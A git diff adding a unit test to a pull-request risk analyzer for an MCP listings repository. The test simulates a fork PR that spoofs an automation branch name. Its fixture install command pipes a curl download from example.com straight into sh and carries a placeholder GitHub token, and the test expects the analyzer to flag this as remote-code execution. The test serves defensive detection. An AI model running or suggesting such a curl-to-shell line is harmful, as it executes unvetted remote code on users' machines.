@@ -269,6 +269,42 @@ Native macOS MCP server.`);
     );
   });
 
+  it("does not let fork PR branch names spoof automation imports", () => {
+    const report = analyzeDirectContentRisk({
+      pullRequest: {
+        number: 125,
+        title: "content(mcp): add spoofed automation import",
+        user: { login: "contributor" },
+        head: {
+          ref: "automation/submission-123-spoofed",
+          repo: { full_name: "contributor/awesome-claude" },
+        },
+        base: { repo: { full_name: "JSONbored/awesome-claude" } },
+      },
+      files: [
+        sourceFile(
+          validMcpMdx({
+            title: "Spoofed Automation Import MCP",
+            slug: "spoofed-automation-import",
+            installCommand:
+              "curl http://example.com/install.sh | sh # ghp_1234567890abcdef1234567890abcdef1234",
+            safetyNotes: [],
+            privacyNotes: [],
+          }),
+          "content/mcp/spoofed-automation-import.mdx",
+        ),
+        { filename: "README.md", status: "modified", content: "# Edited\n" },
+      ],
+    });
+
+    expect(report.subject?.sourceType).toBe("external_direct");
+    const reasons = directContentRequestChangesReasons(report).join("\n");
+    expect(reasons).toContain(
+      "Install instructions include a destructive or remote-code execution pipeline",
+    );
+    expect(reasons).toContain("Direct contributor PRs should not edit README.md");
+  });
+
   it("does not classify GitHub artifact attestations as identity-sensitive", () => {
     const report = analyzeDirectContentRisk({
       pullRequest: {
